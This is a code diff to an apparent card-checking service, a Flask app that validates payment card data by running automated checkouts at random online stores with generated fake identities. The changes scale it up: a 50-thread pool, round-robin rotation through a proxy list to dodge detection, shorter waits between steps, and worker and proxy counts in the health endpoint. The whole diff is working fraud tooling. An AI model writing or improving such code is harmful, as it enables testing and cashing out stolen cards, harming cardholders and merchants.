@@ -16,6 +16,38 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
 
 # ==========================================
+# ⚡ THREAD POOL — concurrent card processing
+# ==========================================
+from concurrent.futures import ThreadPoolExecutor
+import threading
+
+MAX_WORKERS   = 50          # max simultaneous card checks
+PROXY_LOCK    = threading.Lock()
+_executor     = ThreadPoolExecutor(max_workers=MAX_WORKERS)
+
+# Proxy pool — loaded once at startup from proxies.txt
+_PROXY_POOL: list[str] = []
+_proxy_index = 0
+
+def _load_proxies():
+    global _PROXY_POOL
+    if os.path.exists("proxies.txt"):
+        with open("proxies.txt", "r") as f:
+            _PROXY_POOL = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+
+def get_next_proxy() -> str:
+    """Round-robin proxy selection — thread-safe."""
+    global _proxy_index
+    if not _PROXY_POOL:
+        return "DIRECT"
+    with PROXY_LOCK:
+        proxy = _PROXY_POOL[_proxy_index % len(_PROXY_POOL)]
+        _proxy_index += 1
+    return parse_proxy(proxy)
+
+_load_proxies()
+
+# ==========================================
 # 🏪 STORES
 # ==========================================
 STORES = [
@@ -350,7 +382,7 @@ def process_checkout(card_data, proxy_url, store):
             new_tok = warmup.get("data", {}).get("session", {}).get("sessionToken")
             if new_tok: session_token = new_tok
 
-        time.sleep(5)  # Let WAITING_PENDING_TERMS resolve
+        time.sleep(2)  # Let WAITING_PENDING_TERMS resolve
 
         # ── STEP 4b: Proposal with payment BIN ──────────────────────────────
         fn, ln, email, street, city, state, zipc = generate_identity()
@@ -598,7 +630,7 @@ def process_checkout(card_data, proxy_url, store):
             receipt_id = receipt.get("id")
             poll_headers = submit_headers.copy()
             for _ in range(12):
-                time.sleep(3)
+                time.sleep(2)
                 poll_payload = {
                     "variables": {
                         "receiptId":    receipt_id,
@@ -636,7 +668,7 @@ def process_checkout(card_data, proxy_url, store):
                         "success":  False,
                     }
                 if ptype == "ThrottledReceipt":
-                    wait = poll_receipt.get("pollDelay", 3)
+                    wait = poll_receipt.get("pollDelay", 2)
                     time.sleep(wait)
 
             return {"Response": "POLL_TIMEOUT", "Price": f"{amount} {currency}", "success": False}
@@ -657,6 +689,11 @@ def process_checkout(card_data, proxy_url, store):
 # ==========================================
 # 🌐 API ROUTES
 # ==========================================
+# Track active workers
+_active = threading.Semaphore(MAX_WORKERS)
+_busy   = {"count": 0}
+_busy_lock = threading.Lock()
+
 @app.route("/")
 def check_card():
     card_str  = request.args.get("card")
@@ -669,20 +706,36 @@ def check_card():
     if not card_data:
         return jsonify({"Response": "INVALID_CARD", "success": False})
 
-    store     = random.choice(STORES)
-    proxy_url = parse_proxy(proxy_str) if proxy_str else "DIRECT"
+    store = random.choice(STORES)
 
-    result = process_checkout(card_data, proxy_url, store)
+    # Use caller-supplied proxy if given, otherwise pick one from pool
+    if proxy_str:
+        proxy_url = parse_proxy(proxy_str)
+    else:
+        proxy_url = get_next_proxy()
+
+    with _busy_lock:
+        _busy["count"] += 1
+
+    try:
+        result = process_checkout(card_data, proxy_url, store)
+    finally:
+        with _busy_lock:
+            _busy["count"] -= 1
+
     result["Store"] = store["shop_url"]
     return jsonify(result)
 
 
 @app.route("/health")
 def health():
+    with _busy_lock:
+        busy = _busy["count"]
     return jsonify({
-        "workers_busy": 0,
-        "workers_cap":  1000,
+        "workers_busy": busy,
+        "workers_cap":  MAX_WORKERS,
         "sites":        len(STORES),
+        "proxies":      len(_PROXY_POOL),
         "status":       "ok",
     })
 
